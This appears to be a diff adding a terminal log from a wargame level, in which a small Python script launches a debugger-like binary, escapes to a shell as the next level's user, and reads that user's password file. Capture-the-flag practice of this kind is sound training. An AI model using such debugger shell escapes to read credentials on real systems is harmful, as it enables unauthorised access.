@@ -1,0 +1,47 @@
+level1@amateria:/tmp/tmp.FabZFd2tGh$ python hackerman.py
+GNU gdb (GDB) 7.0.1-debian
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Attaching to process 18543
+ptrace: Operation not permitted.
+(gdb)
+(gdb)
+(gdb)
+(gdb) shell
+$ whoami
+level2
+$ cat ~/password
+cat: ~/password: Permission denied
+$ cd /home/level2/password
+cd: 3: can't cd to /home/level2/password
+$ pwd
+/tmp/tmp.FabZFd2tGh
+$ cd /home/level2
+$ ls
+README.txt  password  tags
+$ cat README.txt
+this level has been a bit confusing.
+just some details you might want to know.
+there is a script running that mimics a user of the servcie.
+you do not need to find or target the script. but its kinda important to know,
+that a valid user with the correct password is using the service.
+
+good luck!
+
+~morla
+$ cat password
+blurgel
+$ exit
+(gdb) quit
+level1@amateria:/tmp/tmp.FabZFd2tGh$ cat hackerman.py
+#! /usr/bin/env/python
+
+import os
+
+os.execve("/wargame/lolgdb", (),{})
